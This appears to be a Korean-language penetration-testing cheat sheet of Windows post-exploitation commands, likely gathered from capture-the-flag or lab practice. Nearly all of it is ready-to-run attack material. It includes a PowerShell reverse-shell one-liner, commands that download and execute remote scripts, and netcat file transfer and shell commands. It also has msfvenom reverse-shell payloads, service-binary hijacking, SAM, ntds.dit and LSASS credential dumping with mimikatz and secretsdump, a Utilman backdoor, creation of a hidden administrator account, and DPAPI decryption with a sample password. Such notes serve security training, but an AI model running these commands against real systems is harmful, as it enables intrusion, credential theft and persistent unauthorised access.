<details>
 <summary><strong>WINRM hidden file download</strong></summary>

- `evil-winrm`으로 접속하여 숨김파일 다운로드시 실패하는 경우 발생.
```powershell
# 숨김 속성 제거
attrib -h -s <file>

# base64인코딩
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("<filename>")) | Out-File <output file name>
```
 
</details>

---
<details>
 <summary><strong>NTFS 대체 데이터 스트림(dir /R)</strong></summary>
 
## NTFS 대체 데이터 스트림(ADS)이란?
NTFS 파일 시스템의 특성으로, 하나의 파일에 여러 개의 데이터 스트림을 추가할 수 있는 기능입니다.

### 일반적인 용도
- 인터넷에서 다운로드한 파일의 출처 정보 저장
- 파일의 메타데이터 저장
- macOS의 리소스 포크 호환성

### 보안 위협
- **악성코드 은닉 공간**으로 악용 가능
- 일반 탐색기나 `dir` 명령어로는 보이지 않음
- 파일 크기가 0바이트로 보여도 실제 데이터 존재 가능

## ADS 읽기 방법

### 1. Notepad 사용
```cmd
notepad 파일명:스트림명
notepad test.txt:Zone.Identifier
```

### 2. more 명령어 (리다이렉션)
```cmd
more < 파일명:스트림명
more < test.txt:Zone.Identifier
```

### 3. PowerShell (권장)
```powershell
Get-Content 파일명 -Stream 스트림명
Get-Content test.txt -Stream Zone.Identifier
```
 
</details>

---
<details>
 <summary><strong>Sherlock</strong></summary>

- https://github.com/rasta-mouse/Sherlock
- 예전 버전 윈도우 취약점 발견.
```powershell
. .\sherlock.ps1
Find-AllVulns
```

</details>

---
<details>
 <summary><strong>tasklist</strong></summary>

```powershell
tasklist /v |findstr -i cloudme
```
 
</details>

---
<details>
 <summary><strong>Linux to Windows encoding</strong></summary>

```bash
echo -n iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1') | iconv --to-code UTF-16LE | base64 -w0
```
```powershell
powershell -encodedcommand <encoded>
```
 
</details>

---
<details>
  <summary><strong>lnk file details</strong></summary>

```powershell
powershell -c "$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildItem *.lnk; $WScript.CreateShortcut($sc)"
```
<img width="869" height="400" alt="image" src="https://github.com/user-attachments/assets/c3a1ae52-d113-49cd-8c3a-6077ee61d726" />


</details>

---
<details>
 <summary><strong>Powershell Reverse Shell</strong></summary>

### One liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Invoke-PowerShellTcp.ps1
```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
```
- `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443`를 아래에 추가.

```powershell
powershell iex(new-object net.webclient).downloadstring("http://10.10.10.10/Invoke-PowerShellTcp.ps1")

echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") | powershell -noprofile
```

</details>

---
<details>
 <summary><strong>Modify Service</strong></summary>

- `Serivce`를 수정하여 재시작 할 수 있으면 권한 상승으로 이어질 수 있다.
<img width="1104" height="134" alt="image" src="https://github.com/user-attachments/assets/8cf4e758-c186-41aa-ae4a-dde8860b5be1" />


```powershell
# SERVICE_START_NAME : 서비스 실행 유저 확인.
sc.exe qc usosvc

sc.exe stop usosvc

sc.exe config usosvc binpath="c:\temp\shell.exe"

# 바뀐 BINARY_PATH_NAME 확인.
sc.exe qc usosvc

sc.exe start usosvc
```
 
</details>

---
<details>
 <summary><strong>nc to transfer files</strong></summary>

```powershell
nc 10.10.10.10 80 < file.txt
```
 
</details>

---
<details>
 <summary><strong>findstr</strong></summary>

```powershelll
type <file> | findstr /I /N 'NTLM'
```
 
</details>

---
<details>
 <summary><strong>PowerShell History</strong></summary>

```powershell
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$historyPath

# 파일이 존재하는지 확인
Test-Path $historyPath

# 히스토리 내용 보기
Get-Content $historyPath
```
 
</details>

---
<details>
 <summary><strong>icacls</strong></summary>

```powershell
icacls root.txt /grant alfred:F
```
- root.txt에 alfred에게 Full 권한을 줌
 
</details>

---
<details>
 <summary><strong>파일 검색</strong></summary>


```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
 
</details>

---
<details>
 <summary><strong>시스템 정보 수집</strong></summary>

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember adminteam
```

```powershell
systeminfo
ipconfig /all
route print
netstat -ano
services
```

```powershell
# 32비트 프로그램 설치 목록 (64비트 Windows)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64비트 프로그램 설치 목록
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process
```

```powershell
Get-ChildItem -Path C:\ `
 -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx,*ini `
 -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
# 다른 사용자로 명령 프롬프트 실행
runas /user:backupadmin cmd
```

```powershell
# 실행 중인 서비스 목록 조회
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# 파일 접근 권한 확인
icacls "C:\xampp\apache\bin\httpd.exe"
```
 
</details>

---
<details>
 <summary><strong>Scheduled Tasks</strong></summary>

```powershell
schtasks /query /fo LIST /v
```
 
</details>

---
<details>
 <summary><strong>Token Impersonation (SeImpersonatePrivilege)</strong></summary>

### PrintSpoofer
```powershell
.\print.exe -i -c cmd.exe

.\print.exe -c shell.exe
```

### JuicyPotato
```bash
# msfvenom으로 리버스 셸 생성
msfvenom -p windows/x64/shell_reverse_tcp -f exe
```

```powershell
.\JuicyPotato.exe -t * -p shell.exe -l 443 -c <CLSID>
```
- https://github.com/ohpe/juicy-potato (CLSID 참고)

### GodPotato
```powershell
.\GodPotato.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe -e cmd.exe 192.168.45.162 4040"
```

- https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070

 
</details>

---
<details>
 <summary><strong>Windows Add User Command</strong></summary>

```powershell
# 사용자 생성
net user api Dork123! /add

# 관리자 및 RDP 그룹에 추가
net localgroup Administrators api /add
net localgroup 'Remote Desktop Users' api /add
```
 
</details>

---
<details>
 <summary><strong>AlwaysInstallElevated</strong></summary>

### 레지스트리 확인
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
<img width="1534" height="706" alt="image" src="https://github.com/user-attachments/assets/a70d541f-eb2a-4067-8af6-9a97ecc0d0c8" />

### MSI 패키지 생성 및 실행
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.31.141 lport=443 -a x64 --platform windows -f msi -o ignite.msi
```

```powershell
powershell wget 192.168.31.141/ignite.msi -o ignite.msi
msiexec /quiet /qn /i ignite.msi
```

- https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
 
</details>

---
<details>
 <summary><strong>SeBackupPrivilege</strong></summary>

### base file location
```powershell
C:\windows\system32\SAM
C:\windows\system32\SYSTEM
```

### SAM 및 SYSTEM 레지스트리 덤프
```powershell
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

### 해시 추출 및 Pass-the-Hash
```bash
pypykatz registry --sam sam system
impacket-secretsdump -sam sam -system system

evil-winrm -i <ip> -u <user> -H <hash>
```

### ntds.dit 추출
```bash
# cat backup
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

unix2dos backup 
```

```powershell
diskshadow /s backup
ls E:
robocopy /b E:\Windows\ntds . ntds.dit
```

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL
```

- https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege
 
</details>

---
<details>
 <summary><strong>PowerUp.ps1</strong></summary>

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```
 
</details>

---
<details>
 <summary><strong>SeRestore</strong></summary>

```powershell
# C:\Windows\system32
ren Utilman.exe Utilman.old
ren cmd.exe Utilman.exe
```

```bash
rdesktop 192.168.81.165
# Windows + U 키를 눌러 Utilman 실행 (실제로는 cmd 실행)
```
 
</details>

---
<details>
 <summary><strong>SeManageVolume</strong></summary>

### 방법 1: tzres.dll 교체
```bash
wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll
```

```powershell
. .\EnableAllTokenPrivs.ps1

.\SeManageVolumeExploit.exe

icacls c:\windows

copy tzres.dll C:\Windows\System32\wbem\

systeminfo
```

### 방법 2: WerTrigger 이용
```bash
wget https://github.com/sailay1996/WerTrigger/raw/master/bin/WerTrigger.exe
wget https://github.com/sailay1996/WerTrigger/raw/master/bin/phoneinfo.dll
wget https://raw.githubusercontent.com/sailay1996/WerTrigger/master/bin/Report.wer
```

```powershell
. .\EnableAllTokenPrivs.ps1

.\SeManageVolumeExploit.exe

icacls c:\windows

certutil -urlcache -f http://[IP-ADDRESS]:80/WerTrigger.exe WerTrigger.exe
certutil -urlcache -f http://[IP-ADDRESS]:80/phoneinfo.dll phoneinfo.dll
certutil -urlcache -f http://[IP-ADDRESS]:80/nc.exe nc.exe
certutil -urlcache -f http://[IP-ADDRESS]:80/Report.wer Report.wer

copy phoneinfo.dll c:\windows\system32\

dir c:\windows\system32\phoneinfo.dll

.\wertrigger.exe
c:\temp\nc.exe <ip> <port> -e cmd.exe
```

- https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/
 
</details>

---
<details>
 <summary><strong>Server Operators Group</strong></summary>

```powershell
services

upload nc.exe

sc.exe config VMTools binPath="C:\temp\shell.exe"

# lhost에서 리스너 실행
nc -vnlp 1234

sc.exe stop VMTools
sc.exe start VMTools
```

- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
 
</details>

---
<details>
 <summary><strong>SeDebugPrivilege</strong></summary>

- `Task Manager > Details > choose LSASS > right click > Create dump file`
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
mimikatz.exe

log

sekurlsa::minidump lsass.dmp

sekurlsa::logonpasswords
```

- `https://github.com/decoder-it/psgetsystem`
```powershell
. .\psgetsys.ps1

ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```
 
</details>

---
<details>
 <summary><strong>SeTakeOwnershipPrivilege</strong></summary>

- `https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`
```powershell
Import-Module .\Enable-Privilege.ps1

.\EnableAllTokenPrivs.ps1

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

takeown /f 'C:\Department Shares\Private\IT\cred.txt'

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
 
</details>

---
<details>
 <summary><strong>Backup Operators group</strong></summary>
 
```
# vss.dsh
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```
```bash
# 줄바꿈 변경
unix2dos vss.dsh
```
```powershell
# C드라이브 스냅샷 생성 및 X드라이브로 마운트 - 잠금파일 접근 가능
diskshadow /s vss.dsh

# 데이터 복사
robocopy /b x:\windows\ntds . ntds.dit

reg save HKLM\SAM SAM

reg save HKLM\SYSTEM SYSTEM
```
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
 
</details>

---
<details>
 <summary><strong>Windows 재시작</strong></summary>

```powershell
shutdown /r /t 0
```
 
</details>

---
<details>
 <summary><strong>Windows SSH</strong></summary>

```powershell
C:\Users\<Username>\.ssh
```
 
</details>

---
<details>
 <summary><strong>Path Variables 설정</strong></summary>

```powershell
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```
 
</details>

---
<details>
 <summary><strong>PowerShell 명령어 모음</strong></summary>

```powershell
IEX(New-Object Net.WebClient).DownloadString("http://ip/file")

Rename-Item -Path <String> -NewName <String>

Remove-Item -Path "C:\Path\To\YourFile.txt"

# cmd
where.exe /r c:\ bash.exe

# powershell
Get-ChildItem -Path C:\ -Filter bash.exe -Recurse -ErrorAction SilentlyContinue
```
 
</details>

---
<details>
 <summary><strong>procdump</strong></summary>

- https://live.sysinternals.com/
- 프로세스에서 특히 브라우저가 실행 되고 있을 경우 덤핑하여 확인.
```powershell
.\procdump64 -ma 6252 -accepteula
```
 
</details>

---
<details>
 <summary><strong>Microsoft SQL Server</strong></summary>

- `MS SQL Server`가 설치되어 있으면 `sqlcmd`를 실행할 수 있다.
```powershell
sqlcmd -?

sqlcmd -q 'SELECT table_name from adsync.information_schema.tables';
```
 
</details>

---
<details>
 <summary><strong>DPAPI</strong></summary>

## DPAPI란?
- Windows에서 제공하는 암호화 API로, 사용자 또는 시스템 수준에서 민감한 데이터를 보호합니다.
- `WINRM`으로 다운로드시에 숨김파일로 인해서 다운로드 불가능할 수 있음.

## masterkey 복호화
```bash
impacket-dpapi masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

## Credential files 복호화
```bash
# 복호화된 마스터키를 가지고 자격 증명 파일 복호화
impacket-dpapi credential -file <credential file> -key <복호화된 master key>
```
 
</details>
